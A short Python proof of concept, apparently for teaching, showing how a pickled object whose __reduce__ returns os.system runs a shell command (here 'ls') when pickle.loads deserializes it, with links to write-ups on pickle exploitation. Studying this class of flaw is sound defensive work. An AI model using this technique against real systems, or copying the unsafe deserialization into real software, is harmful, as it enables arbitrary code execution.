#!/usr/bin/python
# -*- coding: utf-8 -*-

import os
import pickle


class Exploit(object):

	def __reduce__(self):
		return (os.system, ('ls',))


def serialize_exploit():
	shellcode = pickle.dumps(Exploit())
	return shellcode


def insecure_deserialize(shellcode):
	pickle.loads(shellcode)


if __name__ == '__main__':
	shellcode = serialize_exploit()
	insecure_deserialize(shellcode)


# https://www.kevinlondon.com/2015/08/15/dangerous-python-functions-pt2.html
# http://v0ids3curity.blogspot.com/2012/10/exploit-exercise-python-pickles.html
# https://blog.nelhage.com/2011/03/exploiting-pickle/